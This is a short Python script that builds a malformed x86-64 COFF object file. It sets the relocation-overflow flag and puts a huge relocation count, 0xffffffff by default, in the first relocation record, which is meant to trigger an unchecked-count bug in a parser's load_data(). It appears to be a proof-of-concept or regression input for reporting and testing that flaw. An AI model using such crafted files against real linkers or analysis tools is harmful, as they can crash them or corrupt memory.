#!/usr/bin/env python3
"""IMAGE_SCN_LNK_NRELOC_OVFL: nrel comes from the dummy record's VirtualAddress
minus 1, is never checked against the file size, and drives load_data()."""
import sys
from gen_coff import *
count = int(sys.argv[1], 0) if len(sys.argv) > 1 else 0xffffffff
# NumberOfRelocations must be 0xffff and the flag set; first record is the count
relocs = [(count, 0, 0)] + [(0, 0, 1)]
o = build(0x8664,
          sections=[sec(b'.data', DATA | 0x01000000, data=b'B'*16,
                        relocs=relocs, nreloc=0xffff)],
          symbols=[sym(b'_x', 0, 1, 2)])
open(sys.argv[2] if len(sys.argv) > 2 else 'ovfl.o', 'wb').write(o)
